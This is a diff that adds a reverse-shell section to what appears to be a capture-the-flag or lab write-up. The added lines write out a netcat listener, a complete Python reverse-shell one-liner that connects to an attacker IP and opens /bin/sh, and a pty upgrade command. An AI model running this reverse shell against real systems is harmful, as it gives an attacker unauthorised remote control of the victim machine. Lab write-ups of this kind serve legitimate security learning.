@@ -383,4 +383,16 @@ Great!
 
 ...And the shell sucks ass. Time to upgrade it.
 
-TODO
+Also, you can use `msfvenom` to generate reverse shell commands. See <https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/> for more info.
+
+Attacker runs:
+
+    nc -lvp 6969
+
+Victim runs:
+
+    python -c 'attackerip="10.10.15.25";attackerport=6969;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((attackerip,attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+And to upgrade:
+
+    python -c 'import pty; pty.spawn("/bin/bash")'
